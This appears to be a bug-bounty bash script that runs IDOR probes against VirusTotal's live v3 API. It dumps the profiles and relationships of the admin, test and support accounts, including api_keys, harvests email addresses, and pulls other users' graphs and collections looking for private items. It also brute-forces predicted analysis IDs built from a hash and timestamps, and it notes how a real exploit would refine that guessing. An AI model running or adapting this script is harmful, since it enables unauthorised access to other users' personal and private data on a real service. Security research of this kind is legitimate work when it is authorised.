#!/usr/bin/env bash
# VirusTotal — H7 follow-up: User IDOR deep probe
# admin/test/support users returned 200 — test what data is exposed
# Run: VT_API_KEY=<key> bash scripts/vt-user-idor.sh 2>&1 | tee ~/vt-user-idor-output.txt

set -euo pipefail
: "${VT_API_KEY:?Set VT_API_KEY}"
UA="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/125.0 Safari/537.36"
BASE="https://www.virustotal.com/api/v3"
OUT="$HOME/bug-bounty-hunting-/results/virustotal.com/evidence"
mkdir -p "$OUT"
CANDIDATES="$HOME/bug-bounty-hunting-/results/virustotal.com/03-candidates/candidates.jsonl"

c() { curl -sk --connect-timeout 12 -A "$UA" -H "x-apikey: ${VT_API_KEY}" "$@"; }

log_candidate() {
  local vuln_class="$1" host="$2" sev="$3" evidence="$4" impact="$5"
  local ts; ts=$(date -u +%Y-%m-%dT%H:%M:%SZ)
  local id; id=$(echo "${vuln_class}${host}${ts}" | md5sum | cut -c1-8)
  echo "{\"id\":\"C${id}\",\"ts\":\"${ts}\",\"vuln_class\":\"${vuln_class}\",\"host\":\"${host}\",\"severity\":\"${sev}\",\"evidence\":\"${evidence}\",\"impact\":\"${impact}\"}" \
    | tee -a "$CANDIDATES"
}

echo "══════════════════════════════════════════════════"
echo "H7: User IDOR — Full Profile + Relationship Dump"
echo "Target users: admin, test, support (all returned 200)"
echo "══════════════════════════════════════════════════"

for TARGET_USER in admin test support; do
  echo ""
  echo "════════ /users/${TARGET_USER} ════════"

  # Full profile
  PROFILE=$(c "${BASE}/users/${TARGET_USER}")
  echo "$PROFILE" | python3 -m json.tool 2>/dev/null | tee "$OUT/user-${TARGET_USER}-profile.json"

  # Extract any sensitive fields
  EMAIL=$(echo "$PROFILE" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('data',{}).get('attributes',{}).get('email','NOT_PRESENT'))" 2>/dev/null || echo "parse_error")
  PRIVATE=$(echo "$PROFILE" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('data',{}).get('attributes',{}).get('private','?'))" 2>/dev/null || echo "?")
  TIER=$(echo "$PROFILE" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('data',{}).get('attributes',{}).get('quotas',{}))" 2>/dev/null | head -c 100 || echo "?")

  echo ""
  echo "[*] email: ${EMAIL}"
  echo "[*] private: ${PRIVATE}"
  echo "[*] tier/quotas: ${TIER}"

  if [ "$EMAIL" != "NOT_PRESENT" ] && [ "$EMAIL" != "parse_error" ]; then
    echo "[!] EMAIL EXPOSED on /users/${TARGET_USER}: ${EMAIL}"
    log_candidate "IDOR-user-email-disclosure" "www.virustotal.com" "HIGH" \
      "GET /api/v3/users/${TARGET_USER} returns email address to any authenticated user" \
      "Any VT user can enumerate email addresses of other VT users, enabling phishing/enumeration"
  fi

  echo ""
  echo "  --- Relationships ---"
  for rel in comments votes graphs collections files api_keys hunting_rulesets \
             retrohunt_jobs monitors followers following organizations; do
    resp=$(c "${BASE}/users/${TARGET_USER}/relationships/${rel}")
    code=$(curl -so /dev/null -w "%{http_code}" --connect-timeout 8 \
      -H "x-apikey: ${VT_API_KEY}" "${BASE}/users/${TARGET_USER}/relationships/${rel}")
    count=$(echo "$resp" | python3 -c "import sys,json; d=json.load(sys.stdin); print(len(d.get('data',[])))" 2>/dev/null || echo "?")

    if [ "$code" = "200" ]; then
      echo "  [200] /users/${TARGET_USER}/relationships/${rel}  count=${count}"
      # If there's actual data, dump it
      if [ "$count" != "0" ] && [ "$count" != "?" ]; then
        echo "$resp" | python3 -m json.tool 2>/dev/null | head -20
        echo ""

        # Check if these are PRIVATE collections/graphs (would be an IDOR)
        if [ "$rel" = "collections" ] || [ "$rel" = "graphs" ]; then
          # Look for private flag in each item
          PRIVATE_ITEMS=$(echo "$resp" | python3 -c "
import sys, json
d = json.load(sys.stdin)
items = d.get('data', [])
private = [i.get('id') for i in items if i.get('attributes', {}).get('private', False)]
public = [i.get('id') for i in items]
print(f'Total: {len(public)}, Private: {len(private)}')
if private:
    print(f'PRIVATE IDs: {private}')
" 2>/dev/null || echo "parse error")
          echo "  [collections/graphs privacy]: ${PRIVATE_ITEMS}"
        fi
      fi
    elif [ "$code" = "403" ]; then
      echo "  [403] /users/${TARGET_USER}/relationships/${rel} (forbidden)"
    fi
  done
done

echo ""
echo "══════════════════════════════════════════════════"
echo "H7b: Cross-user data access — can I read 'admin' user's graphs/collections?"
echo "══════════════════════════════════════════════════"

# If admin user has public graphs, fetch them and check if they contain sensitive intel
echo ""
echo "=== Admin user's graphs ==="
ADMIN_GRAPHS=$(c "${BASE}/users/admin/relationships/graphs")
echo "$ADMIN_GRAPHS" | python3 -m json.tool 2>/dev/null | head -30
GRAPH_IDS=$(echo "$ADMIN_GRAPHS" | python3 -c "
import sys, json
d = json.load(sys.stdin)
ids = [i.get('id','') for i in d.get('data', [])]
print('\n'.join(ids))
" 2>/dev/null)

if [ -n "$GRAPH_IDS" ]; then
  echo ""
  echo "=== Fetching 'admin' user's graph objects ==="
  while IFS= read -r gid; do
    [ -z "$gid" ] && continue
    echo "--- Graph ${gid} ---"
    GRAPH=$(c "${BASE}/graphs/${gid}")
    echo "$GRAPH" | python3 -m json.tool 2>/dev/null | head -20
    # Check if graph is private
    IS_PRIVATE=$(echo "$GRAPH" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('data',{}).get('attributes',{}).get('private', 'unknown'))" 2>/dev/null)
    echo "  [*] private: ${IS_PRIVATE}"
    if [ "$IS_PRIVATE" = "True" ] || [ "$IS_PRIVATE" = "true" ]; then
      echo "  [!!!] PRIVATE GRAPH ACCESSIBLE: ${gid}"
      log_candidate "IDOR-private-graph" "www.virustotal.com" "HIGH" \
        "GET /api/v3/graphs/${gid} returns private graph belonging to 'admin' user to any authenticated user" \
        "Private threat intelligence graphs accessible cross-account — potential intel leak"
    fi
  done <<< "$GRAPH_IDS"
fi

echo ""
echo "=== Admin user's collections ==="
ADMIN_COLLS=$(c "${BASE}/users/admin/relationships/collections")
echo "$ADMIN_COLLS" | python3 -m json.tool 2>/dev/null | head -20
COLL_IDS=$(echo "$ADMIN_COLLS" | python3 -c "
import sys, json
d = json.load(sys.stdin)
ids = [i.get('id','') for i in d.get('data', [])]
print('\n'.join(ids))
" 2>/dev/null)

if [ -n "$COLL_IDS" ]; then
  while IFS= read -r cid; do
    [ -z "$cid" ] && continue
    echo "--- Collection ${cid} ---"
    COLL=$(c "${BASE}/collections/${cid}")
    echo "$COLL" | python3 -m json.tool 2>/dev/null | head -20
    IS_PRIVATE=$(echo "$COLL" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('data',{}).get('attributes',{}).get('private', 'unknown'))" 2>/dev/null)
    echo "  [*] private: ${IS_PRIVATE}"
  done <<< "$COLL_IDS"
fi

echo ""
echo "══════════════════════════════════════════════════"
echo "H7c: File analysis ID prediction (IDOR via known hash + timestamp)"
echo "══════════════════════════════════════════════════"
echo ""
echo "File analysis ID structure confirmed: base64('{hash}:{unix_timestamp}')"
echo ""
echo "=== Test: submit our OWN file twice, decode both IDs ==="
# Submit same content twice
TS1=$(date +%s)
SUBMIT1=$(curl -sk --connect-timeout 15 -A "$UA" -H "x-apikey: ${VT_API_KEY}" \
  -X POST "${BASE}/files" -F "file=@-;filename=test1.txt" <<< "VT-IDOR-TEST-$(date +%s%N)")
ID1=$(echo "$SUBMIT1" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('data',{}).get('id',''))" 2>/dev/null)
echo "Submission 1 ID: ${ID1}"

if [ -n "$ID1" ]; then
  # Decode the ID structure
  python3 -c "
import base64, sys
raw = '${ID1}'
try:
    padding = '=' * (4 - len(raw) % 4) if len(raw) % 4 else ''
    decoded = base64.b64decode(raw + padding).decode('utf-8', errors='replace')
    print(f'Decoded: {decoded}')
    parts = decoded.split(':')
    if len(parts) == 2:
        print(f'  Hash: {parts[0]}')
        print(f'  Timestamp: {parts[1]}')
        import datetime
        try:
            dt = datetime.datetime.fromtimestamp(int(parts[1]), tz=datetime.timezone.utc)
            print(f'  DateTime: {dt}')
        except:
            pass
except Exception as e:
    print(f'Decode failed: {e}')
    print(f'Raw (hex repr): {raw[:20]}...')
"
fi

echo ""
echo "=== Reconstruct analysis ID from known SHA256 + timestamp ==="
echo "If a file's SHA256 is publicly known (e.g. from threat intel) and we know"
echo "approximately when it was submitted to VT, we can construct the ID."
echo ""
# EICAR SHA256: 275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f
# Try to construct an ID for a recent EICAR submission (last 24h)
NOW=$(date +%s)
echo "Testing EICAR SHA256 with timestamps in last 24 hours (sampling 1 per hour)..."
EICAR_SHA="275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"
FOUND_ANY=false

for hours_ago in 0 1 2 3 6 12 24 48; do
  TS=$((NOW - hours_ago * 3600))
  PREDICTED_ID=$(python3 -c "
import base64
payload = '${EICAR_SHA}:${TS}'
encoded = base64.b64encode(payload.encode()).decode().rstrip('=')
print(encoded)
")
  resp=$(c "${BASE}/analyses/${PREDICTED_ID}")
  code=$(curl -so /dev/null -w "%{http_code}" --connect-timeout 6 \
    -H "x-apikey: ${VT_API_KEY}" "${BASE}/analyses/${PREDICTED_ID}")

  if [ "$code" = "200" ]; then
    echo "[!!!] ANALYSIS ID RECONSTRUCTED: ${PREDICTED_ID}"
    echo "[!!!] Hours ago: ${hours_ago}, Timestamp: ${TS}"
    echo "$resp" | python3 -m json.tool 2>/dev/null | head -20
    FOUND_ANY=true
    log_candidate "IDOR-analysis-id-prediction" "www.virustotal.com" "HIGH" \
      "Reconstructed file analysis ID for EICAR at timestamp ${TS} → 200 OK" \
      "Analysis IDs are predictable (base64(hash:timestamp)): anyone who knows a file's SHA256 and approximate submission time can access private analysis results"
  fi
done

if [ "$FOUND_ANY" = "false" ]; then
  echo "No exact timestamp match found (as expected — timestamp must be exact second)"
  echo "In a real exploit: narrow window by checking when the file first appeared in VT search"
fi

echo ""
echo "══════════════════════════════════════════════════"
echo "H5b: Correct paths for premium endpoints"
echo "══════════════════════════════════════════════════"
echo ""
echo "=== Testing alternate paths for premium features ==="
for ep in \
  "/hunting/retrohunt_jobs" \
  "/hunting/rulesets" \
  "/file_feed" \
  "/file_behaviours" \
  "/intelligence/file_feedback" \
  "/intelligence/hunting_rulesets" \
  "/intelligence/retrohunt_jobs" \
  "/livehunt" \
  "/livehunt/rulesets" \
  "/retrohunt" \
  "/premium/files" \
  "/subscriptions"; do
  code=$(curl -so /dev/null -w "%{http_code}" --connect-timeout 6 \
    -H "x-apikey: ${VT_API_KEY}" "${BASE}${ep}")
  resp=$(c "${BASE}${ep}" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('error',{}).get('code','OK') + ' ' + d.get('error',{}).get('message','')[:50])" 2>/dev/null || echo "")
  echo "${code}  ${ep}  ${resp}"
done

echo ""
echo "Done. Check: $CANDIDATES"
